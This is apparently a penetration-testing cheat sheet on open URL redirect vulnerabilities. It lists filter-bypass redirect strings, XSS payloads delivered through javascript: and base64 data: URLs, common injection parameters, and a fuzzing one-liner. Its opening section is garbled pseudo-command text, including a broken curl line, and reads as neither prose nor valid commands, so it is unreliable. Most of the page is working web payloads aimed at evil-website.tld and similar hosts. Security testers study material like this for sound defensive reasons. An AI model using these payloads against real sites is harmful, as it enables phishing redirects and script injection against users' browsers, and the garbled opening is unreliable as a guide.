# Open URL Redirection
> Unvalidate redirect&forward when web.app accept untrusted i/o
> Cause web.app redirect request to URL container in untrusted i/o --mod
> untrustURL i/o to xxx.com from --attc %% --launch xxx.com --cred 
> xxx.com --mod Link ID 
> xxx.com/mod --pass web.app/ctrl --fwd -write -permission code.js 
$ curl -usr -pwd
- [Exploitation](#exploitation)
- [HTTP Redirection Status Code - 3xx](#http-redirection-status-code---3xx)
- [Fuzzing](#fuzzing)
- [Filter Bypass](#filter-bypass)
- [Common injection parameters](#common-injection-parameters)
- [References](#references)
> https://famous-website.tld/
> https://famous-website.tld/signup?redirectUrl=https://famous-website.tld/account
# After signing up redirect to account. Redirection specified by `redirectUrl` -para in URL 'famous-website.tld/account` to `evil-website.tld`<?php
https://famous-website.tld/signup?redirectUrl=https://evil-website.tld/account?>
> this url, if redirected to `evil-website.tld` after signup Open Redirect --vuln this abuse from -attcr --display xxx.com/ask/cred
# HTTP Redirection Status Code - 3xx
- [300 Multiple Choices](https://httpstatuses.com/300)
- [301 Moved Permanently](https://httpstatuses.com/301)
- [302 Found](https://httpstatuses.com/302)
- [303 See Other](https://httpstatuses.com/303)
- [304 Not Modified](https://httpstatuses.com/304)
- [305 Use Proxy](https://httpstatuses.com/305)
- [307 Temporary Redirect](https://httpstatuses.com/307)
- [308 Permanent Redirect](https://httpstatuses.com/308)
# Fuzzing
>>> -mv www.whitelisteddomain.tld from *open-redirect-payloads.txt* --whiteList xxx.com --test --case --display --mod WHITELISTEDDOMAIN === value www.test.com 
<>
>>> WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
# Filter Bypass
/!\Using a whitelisted domain or keyword
www.whitelisted.com.evil.com redirect to evil.com
/!\Using CRLF to bypass "javascript" blacklisted keyword
java%0d%0ascript%0d%0a:alert(0)
/!\Using "//" & "////" to bypass "http" blacklisted keyword
//google.com
////google.com
/!\Using "https:" to bypass "//" blacklisted keyword
https:google.com
/!\Using "\/\/" to bypass "//" blacklisted keyword (Browsers see \/\/ as //)
\/\/google.com/
/\/google.com/
/!\Using "%E3%80%82" to bypass "." blacklisted character
/?redir=google。com
//google%E3%80%82com
/!\Using null byte "%00" to bypass blacklist filter
//google%00.com
/!\Using parameter pollution
?next=whitelisted.com&next=google.com
/!\Using "@" character, browser will redirect to anything after the "@"
http://www.theirsite.com@yoursite.com/
/!\Creating folder as their domain
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
/!\Using "?" characted, browser will translate it to "/?"
http://www.yoursite.com?http://www.theirsite.com/
http://www.yoursite.com?folder/www.folder.com
Host/Split Unicode Normalization
https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
http://a.com／X.b.com
XSS from Open URL - If it's in a JS variable
";alert(0);//
XSS from data:// wrapper
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
XSS from javascript:// wrapper
http://www.example.com/redirect.php?url=javascript:prompt(1)
# Common injection parameters
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
* filedescriptor
* [You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
* [OWASP - Unvalidated Redirects and Forwards Cheat Sheet](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
* [Cujanovic - Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
* [Pentester Land - Open Redirect Cheat Sheet](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
* [Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7](https://s0cket7.com/open-redirect-vulnerability/)
* [Host/Split
Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
